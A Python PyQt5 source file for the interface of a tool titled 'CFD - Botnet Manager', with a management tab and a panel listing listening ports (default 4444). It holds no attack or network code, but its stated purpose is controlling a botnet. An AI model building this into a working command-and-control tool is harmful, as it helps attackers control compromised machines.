#!/usr/bin/python3

import sys
from PyQt5.QtWidgets import *
from PyQt5.QtGui import QFont, QIcon
from PyQt5 import sip
from PyQt5.QtCore import QThread, pyqtSignal
import extra, masterHelper
import threading, time
from functools import partial

# --- Tab Scripts --- #
from tabs import managementTab

class currentPortsPanel(QGroupBox):
	def __init__(self, mainLayout):
		super().__init__("Listening On Ports")
		self.mainLayout = mainLayout
		self.initUI()

	def initUI(self):
		

		self.updatePorts()
		#vBox.addWidget(refreshButton)
		
		

	def updatePorts(self):
		vBox = QVBoxLayout()
		for port in self.mainLayout.mainWindow.availablePorts:
			text = QLabel(str(port))
			vBox.addWidget(text)
		vBox.addStretch(1)

		hBox = QHBoxLayout()

		# portInput = QLineEdit()
		# portInput.setFixedWidth(100)
		# hBox.addWidget(portInput)
		# hBox.addStretch(1)

		vBox.addLayout(hBox)

		self.mainLayout.deleteLayout(self.layout())
		self.setLayout(vBox)

class listeningTab(QWidget):
	def __init__(self, mainWindow):
		super().__init__()

		self.mainWindow = mainWindow

		self.initUI()

	def initUI(self):
		self.grid = QGridLayout()
		self.grid.setSpacing(10)

		dataBox = QGroupBox()

		addPortBox = QLineEdit()

		vBox = QVBoxLayout()
		vBox.addWidget(addPortBox)

		dataBox.setLayout(vBox)
		self.currentPortsPanel = currentPortsPanel(self)

		self.grid.addWidget(dataBox, 0, 0, 1, 1)
		self.grid.addWidget(self.currentPortsPanel, 1, 2, 1, 1)

		self.setLayout(self.grid)

	def deleteLayout(self, cur_lay):
		if cur_lay is not None:
			while cur_lay.count():
				item = cur_lay.takeAt(0)
				widget = item.widget()
				if widget is not None:
					widget.deleteLater()
				else:
					self.deleteLayout(item.layout())

class toolbar(QMainWindow):
    
	def __init__(self):
		super().__init__()
		self.availablePorts = [4444]
		self.initUI()



	def center(self):
		qr = self.frameGeometry()
		cp = QDesktopWidget().availableGeometry().center()
		qr.moveCenter(cp)
		self.move(qr.topLeft())

	def quitApp(self):
		reply = QMessageBox.question(self, 'Message', 'Are you sure?', QMessageBox.Yes | QMessageBox.No, QMessageBox.No)

		if(reply == QMessageBox.Yes):
			QApplication.instance().quit()

	def toggleMenu(self, state):
		if state:
			self.toolbar.show()
		else:
			self.toolbar.hide()

	def initUI(self):

		QToolTip.setFont(QFont('SansSerif', 10))

		# btn = QPushButton('Quit', self)
		# btn.setToolTip('Quits The Manager')
		# btn.resize(btn.sizeHint())
		# btn.move(50, 50)
		#
		#btn.clicked.connect(self.quitApp)

		# --- MENUBAR --- #

		exitAct = QAction(QIcon(), '&Exit', self)
		exitAct.setShortcut('Ctrl+Q')
		exitAct.setStatusTip('Exits App')
		exitAct.triggered.connect(qApp.quit)

		viewStatAct = QAction('View Toolbar', self, checkable=True)
		viewStatAct.setShortcut('Ctrl+T')
		viewStatAct.setStatusTip('View Toolbar')
		viewStatAct.setChecked(True)
		viewStatAct.triggered.connect(self.toggleMenu)

		self.menubar = self.menuBar()
		fileMenu = self.menubar.addMenu('&File')
		fileMenu.addAction(exitAct)

		viewMenu = self.menubar.addMenu('&View')
		viewMenu.addAction(viewStatAct)

		# -- TOOLBAR -- #
		self.toolbar = self.addToolBar('')
		self.toolbar.addAction(self.createTab(0, "Management"))
		self.toolbar.addAction(self.createTab(1, "Listening Management"))

		self.visibleWindow = QStackedWidget()

		self.setCentralWidget(self.visibleWindow)

		self.resize(1920, 1080)
		self.center()	
		self.setWindowTitle('CFD - Botnet Manager')  
		self.show()

	def createTab(self, tabNumber, tabName):
		switchAct = QAction(QIcon(), '&' + tabName, self)
		switchAct.triggered.connect(partial(self.switchTab, tabNumber))
		return switchAct

	def switchTab(self, tabNumber):
		for tab in self.tabs:
			tab.hide()
		self.tabs[tabNumber].show()
	# def contextMenuEvent(self, event):
	# 	# --- Context Menu --- #
	# 	cmenu = QMenu(self)

	# 	quitAct = cmenu.addAction("Quit")

	# 	action = cmenu.exec_(self.mapToGlobal(event.pos()))

	# 	if action == quitAct:
	# 		qApp.quit()

app = QApplication(sys.argv)

ex = toolbar()

tabsList = [managementTab.init(ex), listeningTab(ex)]

ex.tabs = tabsList


for tab in tabsList:
	ex.visibleWindow.addWidget(tab)
	tab.hide()

tabsList[0].show()

#switchTab(0, tabs, ex)

sys.exit(app.exec_())

